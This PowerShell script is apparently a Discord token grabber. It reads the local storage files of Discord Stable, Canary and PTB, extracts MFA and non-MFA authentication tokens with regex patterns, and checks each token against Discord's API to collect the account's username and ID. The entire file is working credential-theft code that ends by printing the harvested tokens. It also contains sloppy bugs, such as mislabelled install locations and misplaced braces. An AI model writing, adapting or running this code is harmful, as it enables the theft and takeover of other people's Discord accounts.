# http://f1sk.xyz // http://jayy.xyz
# <3

# Set / Reset varibles
$id=""
$tmpID=""
$user=""
$tmpTag=""

# Declare the array that stores the grabbed tokens
$possibleTokens = @()

# Define the Discord paths
$discordPath = $env:APPDATA+"\discord"
$storagePath = "\Local Storage\leveldb"
$stable = $discordPath+$storagePath
$canary = $discordPath+"canary"+$storagePath
$ptb = $discordPath+"ptb"+$storagePath

# Debug lines to show the paths of the different Discord install locations
# Write-Output $stable
# Write-Output $canary
# Write-Output $ptb

# Checks if Discord (Stable) is installed
if ( Test-Path -LiteralPath $stable ) {
    # Discord Stable is installed

    # Debug line to show that it is installed
    # Write-Output "stable ok"

    # Set the location to the Discord Stable dir
    Set-Location $stable

    # Get the tokens
    $files = @(Get-ChildItem *.ldb) # Get all files ending with -ldb in the dir
    Foreach ($file in $files)
    {
        # Debug lines to show the filename and that it is searching for MFA tokens
        # Write-Output $file
        # Write-Output "Looking for MFA tokens"
        
        # Get MFA tokens
        # Searches the file with a pattern
        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

        # Checks if the result is longer than 1
        if ($mfa.length -gt 1) {
            
            # Debug - show that we found a token
            # Write-Output "Found a token"
            # Write-Output "Checking token : "$mfa

            # Validate the token using the Discord API
            try {

                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue

            } catch {

                # We wont use this for anything as it is most likely just the 403 error.
                # $_.Exception.Response.StatusCode.Value__
            }

            }

            # Checks if the status code is 200 - then get some info about the token (ID, Username, Tag)
            if ($r.statusCode -eq "200") 

            {

                # Debug - Show that we found a valid token
                # Write-Output "Valid token : "
                # Write-Output $mfa

                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id

                # Debug - Show the ID of the token
                # Write-Output "ID : " + $id

                # Add the token, and user info to the array
                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordStable";Token=$mfa;User=$user;ID=$id})

            } else {

                # Debug - Show that it is an invalid token
                # Write-Output "invalid token"
                # Write-Output $mfa

            }

            # Reset the vars
            $id=""
            $tmpID=""
            $user=""
            $r=""

            # Debug -  Show that we are searching for normal tokens (Tokens without MFA)
            # Write-Output "Looking for normal tokens"

            # Get tokens without MFA - this is just the same as with the MFA tokens, but with another pattern

            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

            if ($tkn.length -gt 2) {

                # Write-Output "Found a token"
                # Write-Output "Checking token : "$tkn

                try {

                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
                } catch {

                     # $_.Exception.Response.StatusCode.Value__
            }

                }

                if ($r.statusCode -eq "200")

                {

                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id

                    # Write-Output "Valid token : "
                    # Write-Output $mfa
                    # Write-Output "id : "$id

                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordStable";Token=$tkn;User=$user;ID=$id})

                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""

                } else {

                    # Write-Output "invalid token"
                    # Write-Output $mfa

                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""

                }

}
#END STABLE
}

#CHECK DISCORD CANARY
if ( Test-Path -LiteralPath $canary ) {

    #DISCORD CANARY IS INSTALLED

    # Write-Output "canary ok"

    Set-Location $canary


    #GRAB TOKENS

    $files = @(Get-ChildItem *.ldb)

    Foreach ($file in $files)

    {

        # Write-Output $file

        # Write-Output "Looking for MFA tokens"

        #MFA TOKENS

        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

        ## Write-Output $mfa

        if ($mfa.length -gt 1) {

            # Write-Output "Found a token"
            # Write-Output "Checking token : "$mfa

            try {

                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue

            } catch {

                 # $_.Exception.Response.StatusCode.Value__
            }

            }

            if ($r.statusCode -eq "200")

            {

                # Write-Output "Valid token : "
                # Write-Output $mfa

                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id
                # Write-Output "ID : " + $id

                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordCanary";Token=$mfa;User=$user;ID=$id})

                $r=""
                $id=""
                $tmpID=""
                $user=""

            } else {

                # Write-Output "invalid token"
                # Write-Output $mfa

                $r=""
                $id=""
                $tmpID=""
                $user=""

            }


            # Write-Output "Looking for normal tokens"

            #NORMAL TOKENS

            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

            if ($tkn.length -gt 2) {

                # Write-Output "Found a token"
                # Write-Output "Checking token : "$tkn

                try {

                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue

                } catch {

                     # $_.Exception.Response.StatusCode.Value__
            }

                }

                if ($r.statusCode -eq "200")

                {

                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id

                    # Write-Output "Valid token : "
                    # Write-Output $mfa
                    # Write-Output "id : "$id

                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordCanary";Token=$tkn;User=$user;ID=$id})

                    $id=""
                    $r=""
                    $tmpID=""
                    $user=""

                } else {

                    # Write-Output "invalid token"
                    # Write-Output $mfa

                    $id = ""

                }
}

#END CANARY
}

#CHECK DISCORD PTB

if ( Test-Path -LiteralPath $ptb ) {

    #DISCORD PTB IS INSTALLED

    # Write-Output "ptb ok"

    Set-Location $ptb

    #GRAB TOKENS

    $files = @(Get-ChildItem *.ldb)

    Foreach ($file in $files)

    {

        # Write-Output $file
        # Write-Output "Looking for MFA tokens"

        #MFA TOKENS

        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

        # Write-Output $mfa

        if ($mfa.length -gt 1) {

            # Write-Output "Found a token"
            # Write-Output "Checking token : "$mfa

            try {

                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue

            } catch {

                 # $_.Exception.Response.StatusCode.Value__
            }

            }

            if ($r.statusCode -eq "200")

            {

                # Write-Output "Valid token : "
                # Write-Output $mfa

                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id

                # Write-Output "ID : " + $id

                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordCanary";Token=$mfa;User=$user;ID=$id})

                $r=""
                $id=""
                $tmpID=""
                $user=""

            } else {

                # Write-Output "invalid token"
                # Write-Output $mfa

                $r=""
                $id=""
                $tmpID=""
                $user=""

            }

            # Write-Output "Looking for normal tokens"

            #NORMAL TOKENS

            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }

            if ($tkn.length -gt 2) {

                # Write-Output "Found a token"
                # Write-Output "Checking token : "$tkn

                try {

                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue 

                } catch {

                     # $_.Exception.Response.StatusCode.Value__
            }

                }

                if ($r.statusCode -eq "200")

                {

                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id

                    # Write-Output "Valid token : "
                    # Write-Output $mfa
                    # Write-Output "id : "$id

                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordCanary";Token=$tkn;User=$user;ID=$id})

                    $id=""
                    $r=""
                    $tmpID=""
                    $user=""

                } else {

                    # Write-Output "invalid token"
                    # Write-Output $mfa

                    $id = ""

                }
}

#END PTB

}

#RESET VARS

$id=""
$tmpID=""
$user=""
$tmpTag=""

#DEBUG OUTPUT

Write-Output $possibleTokens
